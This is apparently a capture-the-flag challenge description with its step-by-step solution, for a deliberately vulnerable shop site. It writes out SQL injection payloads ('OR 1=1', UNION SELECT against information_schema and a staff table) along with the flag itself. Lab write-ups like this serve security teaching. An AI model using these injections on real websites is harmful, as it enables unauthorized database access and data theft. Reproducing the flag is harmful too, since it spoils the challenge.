The Overpriced Shop

Look at this shop I found online, everything's so expensive!
Let's teach them how to manage their prices by hacking into their website!
I have gathered this piece of information on its infrastructure:
    - The name of the database schema is 'the_overpriced_shop'

Good luck!

http://<ip-address>/index.html

--------------- Flag ---------------
GCTF{0v3rPr1c3d_1nJ3ct10N}

--------------- Step-by-Step Solution ---------------
Note: Any user input containing #'s are blocked, so commenting has to be done using "-- "

1. To display all data in the current table, input:


' OR 1=1 -- 

Final Query:
SELECT * FROM products WHERE id = '' OR 1=1 -- '

The last row stands out as it contains a cipher key (expensive) we can use later on.


2. We are told the schema name. To view other tables present in the schema, input:


' UNION SELECT table_name, table_schema, 3, 4 FROM information_schema.tables WHERE table_schema = 'the_overpriced_shop

Final Query: 
SELECT * FROM products WHERE id = '' UNION SELECT table_name, table_schema, 3, 4 FROM information_schema.tables WHERE table_schema = 'the_overpriced_shop'

We are shown 2 tables under the 'the_overpriced_shop' schema (products, staff)


3. Now, we know the name of the other table (staff). To display all data in the 'staff' table, input:


' UNION SELECT * FROM staff -- 

Final Query:
SELECT * FROM products WHERE id = '' UNION SELECT * FROM staff -- '

Luckily, the 'staff' table also has 4 columns so the UNION SELECT statement works. Notice one of the rows has fields containing:
    - A ciphertext -> KZIJ{0i3jXm1g3h_1kY3gg10F},
    - A cipher -> Vigenere.


4. Use the Vigenere cipher to decrypt the ciphertext using the key from earlier, and obtain the flag :)


--------------- Installations ---------------
npm install express
npm install cors
npm install mysql